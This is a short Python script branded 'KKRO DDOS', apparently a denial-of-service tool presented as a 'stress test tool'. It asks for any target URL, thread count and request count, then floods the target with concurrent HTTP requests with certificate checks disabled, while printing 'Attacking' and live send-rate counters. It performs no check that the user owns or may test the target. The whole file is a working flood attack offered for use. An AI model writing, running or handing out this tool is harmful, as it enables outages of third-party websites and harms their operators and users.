import threading
import urllib.request
import time
import ssl
import os

# Clear screen
os.system('clear')

# Logo KKRO DDOS
print("\033[1;31m")
print(" ██╗  ██╗██╗  ██╗██████╗  ██████╗      ██████╗ ██████╗  ██████╗ ███████╗")
print(" ██║ ██╔╝██║ ██╔╝██╔══██╗██╔═══██╗    ██╔═══██╗██╔══██╗██╔═══██╗██╔════╝")
print(" █████╔╝ █████╔╝ ██████╔╝██║   ██║    ██║   ██║██║  ██║██║   ██║███████╗")
print(" ██╔═██╗ ██╔═██╗ ██╔══██╗██║   ██║    ██║   ██║██║  ██║██║   ██║╚════██║")
print(" ██║  ██╗██║  ██╗██║  ██║╚██████╔╝    ╚██████╔╝██████╔╝╚██████╔╝███████║")
print(" ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝")
print("\033[0m")

print("\033[1;36m" + "="*50)
print("       KKRO DDOS - STRESS TEST TOOL")
print("="*50 + "\033[0m\n")

# SSL context
ctx = ssl._create_unverified_context()

# Input langsung tanpa password
url = input("\033[1;33m[+] Target URL: \033[0m").strip()
if not url.startswith(('http://', 'https://')):
    url = 'http://' + url

try:
    threads = int(input("\033[1;33m[+] Threads: \033[0m"))
    requests = int(input("\033[1;33m[+] Requests: \033[0m"))
except:
    print("\033[1;31m[!] Invalid input\033[0m")
    exit()

print(f"\n\033[1;32m[+] Attacking {url}...\033[0m")

sent = 0
failed = 0
start = time.time()

def attack():
    global sent, failed
    for _ in range(requests):
        try:
            urllib.request.urlopen(url, timeout=5, context=ctx)
            sent += 1
        except:
            failed += 1

attack_threads = []
for i in range(threads):
    t = threading.Thread(target=attack)
    t.start()
    attack_threads.append(t)

while any(t.is_alive() for t in attack_threads):
    elapsed = time.time() - start
    if elapsed > 0:
        speed = sent / elapsed
    else:
        speed = 0
    
    print(f"\r\033[1;36mSent: {sent:,} | \033[1;31mFailed: {failed:,} | \033[1;33mTime: {elapsed:.1f}s | \033[1;35mSpeed: {speed:.0f}/s\033[0m", end='')
    time.sleep(0.2)

print(f"\n\n\033[1;32m[+] Done! Sent: {sent:,} requests")